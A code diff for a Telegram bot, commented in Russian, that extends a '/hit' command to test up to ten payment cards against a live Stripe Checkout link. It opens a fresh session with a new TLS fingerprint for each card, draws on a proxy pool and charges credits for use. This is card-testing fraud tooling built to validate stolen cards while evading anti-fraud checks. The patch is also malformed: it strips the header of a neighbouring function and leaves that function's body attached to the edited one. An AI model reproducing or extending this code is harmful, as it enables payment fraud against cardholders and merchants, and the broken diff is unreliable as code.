@@ -349,85 +349,96 @@ def _pick_gate(force: str | None) -> str | None:
 @app.on_message(filters.command(["hit"]))
 @user_only
 async def cmd_hit(client, message: Message):
-    """Stripe Checkout /hit: /hit <cs_live-url> CC|MM|YY|CVC — проверка по готовому чекаут-линку."""
+    """Stripe Checkout /hit: /hit <cs_live-url> CC|MM|YY|CVC [карта2 ...] —
+    много карт по одному линку, каждая со своей СВЕЖЕЙ HTTP-сессией
+    (разные TLS-фингерпринты/куки), пока линк жив."""
     u_id = message.from_user.id
     db.ensure_user(u_id, message.from_user.username or "")
     if not db.antispam_ok(u_id):
         return await message.reply("⏳ Слишком часто — подождите пару секунд (антиспам)")
     raw = (message.text or message.caption or "").split()
     if len(raw) < 3 or not raw[1].startswith("http") or "cs_" not in raw[1]:
-        return await message.reply("Формат: <code>/hit &lt;cs_live-url&gt; CC|MM|YY|CVC</code> — линк любого Stripe Checkout (checkout.stripe.com, pay.*, buy.stripe.com)", parse_mode=ParseMode.HTML)
+        return await message.reply(
+            "Формат: <code>/hit &lt;cs_live-url&gt; CC|MM|YY|CVC [карта2 ...]</code> — линк любого Stripe Checkout, до 10 карт за раз",
+            parse_mode=ParseMode.HTML)
     target_url = raw[1]
-    card_line = " ".join(raw[2:])
-    parts = _card_fields(card_line)
-    if parts is None:
-        return await message.reply("Формат карты: CC MM YY CVV")
-    if not gc.check_luhn("".join(ch for ch in parts[0] if ch.isdigit())):
-        return await message.reply("❌ Неверный номер карты (Luhn fail)")
-    if not db.spend_credit(u_id, "hit"):
-        return await message.reply("❌ Недостаточно кредитов (2/чек)")
-    status_msg = await message.reply(f"💳 Проверка · {gate_label('hit')}...")
-    t0 = asyncio.get_event_loop().time()
-    bin6 = "".join(ch for ch in parts[0] if ch.isdigit())[:6]
-    binfo_task = asyncio.ensure_future(setup_gate.bin_lookup(bin6))
-    gs = hit_engine.CsHitSession(target_url)
-    try:
-        ok, detail = await gs.open()
-        if not ok:
+    # карты: остальные токены + многострочность (reply на сообщение с картами тоже работает)
+    card_lines = " ".join(raw[2:])
+    if "\n" in (message.text or ""):
+        card_lines = (message.text or "").split("\n", 1)[1].replace(target_url, " ")
+    cards = []
+    for ln in card_lines.replace(",", " ").split():
+        f = _card_fields(ln)
+        if f and f not in cards:
+            cards.append(f)
+    cards = cards[:10]
+    if not cards:
+        return await message.reply("Карта не распознана: CC MM YY CVV")
+    for f in cards:
+        if not gc.check_luhn("".join(ch for ch in f[0] if ch.isdigit())):
+            return await message.reply("❌ Неверный номер карты (Luhn fail)")
+    meta_cost = 2
+    u = db.get_user(u_id)
+    is_prem = db.is_premium(u)
+    if not is_prem and u.get("credits", 0) < len(cards) * meta_cost:
+        return await message.reply(f"❌ Недостаточно кредитов: {len(cards)} карт × 2 = {len(cards) * meta_cost}")
+    status_msg = await message.reply(f"⚡ /hit · {len(cards)} карт · бью по линку со свежими сессиями...")
+    results = []
+    link_dead = None
+    for idx, f in enumerate(cards, 1):
+        if link_dead:
+            results.append({"card": formatter.fmt_pan(f[0]), "status": "ERROR",
+                            "detail": f"линк умер: {link_dead[:60]}"})
+            continue
+        if not db.spend_credit(u_id, "hit"):
+            results.append({"card": formatter.fmt_pan(f[0]), "status": "ERROR",
+                            "detail": "Недостаточно кредитов"})
+            link_dead = "кредиты закончились"
+            continue
+        gs = hit_engine.CsHitSession(target_url)  # СВЕЖАЯ сессия на каждую карту
+        try:
+            ok, detail = await gs.open()
+            if not ok:
+                db.refund_credit(u_id, "hit")
+                link_dead = detail[:80]
+                results.append({"card": formatter.fmt_pan(f[0]), "status": "ERROR",
+                                "detail": f"линк: {detail[:80]}"})
+                await gs.close()
+                continue
+            res = await gs.check_card("|".join(f))
+        except Exception as e:
+            res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:150]}
+        finally:
+            await gs.close()
+        verdict = res.get("status", "ERROR")
+        detail = str(res.get("detail", ""))
+        amount = res.get("amount_cents") or 0
+        currency = res.get("currency") or ""
+        if verdict == "ERROR":
             db.refund_credit(u_id, "hit")
-            await status_msg.edit_text(f"❌ Линк не открыт: {detail}")
-            return
-        res = await gs.check_card("|".join(parts))
-    except Exception as e:
-        res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:180]}
-    finally:
-        await gs.close()
-    verdict = res.get("status", "ERROR")
-    detail = res.get("detail", "")
-    amount = res.get("amount_cents") or 0
-    currency = res.get("currency") or ""
-    if verdict == "ERROR":
-        db.refund_credit(u_id, "hit")
-    else:
-        price_s = formatter.fmt_price(amount, currency)
-        detail = f"[{price_s}] {detail}" if price_s else detail
-    latency_ms = int((asyncio.get_event_loop().time() - t0) * 1000)
-    try:
-        binfo = await asyncio.wait_for(binfo_task, timeout=4)
-    except Exception:
-        binfo = {}
-    if verdict in HIT_VERDICTS:
-        db.add_hit(u_id)
-    a_proxy = None
-    a_pool = None
-    if u_id in config.ADMIN_IDS:
-        a_pool = len(gc.load_proxies())
-    await status_msg.edit_text(
-        formatter.format_single(parts[0], binfo, gate_label("hit"), verdict,
-                                detail, latency_ms, proxy=a_proxy, pool_size=a_pool),
-        parse_mode=ParseMode.HTML)
-
-
-
-@app.on_message(filters.command(["mass"]))
-@user_only
-async def cmd_mass(client, message: Message):
-    u_id = message.from_user.id
-    db.ensure_user(u_id, message.from_user.username or "")
-    if not db.antispam_ok(u_id):
-        return await message.reply("⏳ Слишком часто — подождите пару секунд (антиспам)")
-
-    cards_text = ""
-    gate_forced = None
-
-    parts = (message.text or "").split()
-    if len(parts) > 1 and GATE_ALIASES.get(parts[1], parts[1]) in GATES:
-        gate_forced = GATE_ALIASES.get(parts[1], parts[1])
-        raw_tail = " ".join(parts[2:])
-    else:
-        raw_tail = " ".join(parts[1:])
-
-    # Check if document / reply
+        else:
+            price_s = formatter.fmt_price(amount, currency)
+            detail = f"[{price_s}] {detail}" if price_s else detail
+            if verdict in HIT_VERDICTS:
+                db.add_hit(u_id)
+        results.append({"card": formatter.fmt_pan(f[0]), "status": verdict,
+                        "detail": detail[:60]})
+        if idx < len(cards):
+            await asyncio.sleep(1.2)
+    pool_line = f" | 📡 Пул: {len(gc.load_proxies())}" if u_id in config.ADMIN_IDS else ""
+    summary = (f"⚡ <b>/hit · {len(results)}/{len(cards)} карт</b>{pool_line}\n"
+               + formatter.format_mass(results, header=False))
+    # TG-лимит: режем на чанки
+    chunk, chunks = [], []
+    for line in summary.split("\n"):
+        if len("\n".join(chunk)) + len(line) + 1 > 3900:
+            chunks.append("\n".join(chunk))
+            chunk = []
+        chunk.append(line)
+    chunks.append("\n".join(chunk))
+    await status_msg.edit_text(chunks[0], parse_mode=ParseMode.HTML)
+    for extra in chunks[1:]:
+        await message.reply(extra, parse_mode=ParseMode.HTML)
     if message.reply_to_message and message.reply_to_message.document:
         doc = await message.reply_to_message.download(in_memory=True)
         cards_text = bytes(doc.getbuffer()).decode("utf-8", errors="ignore")
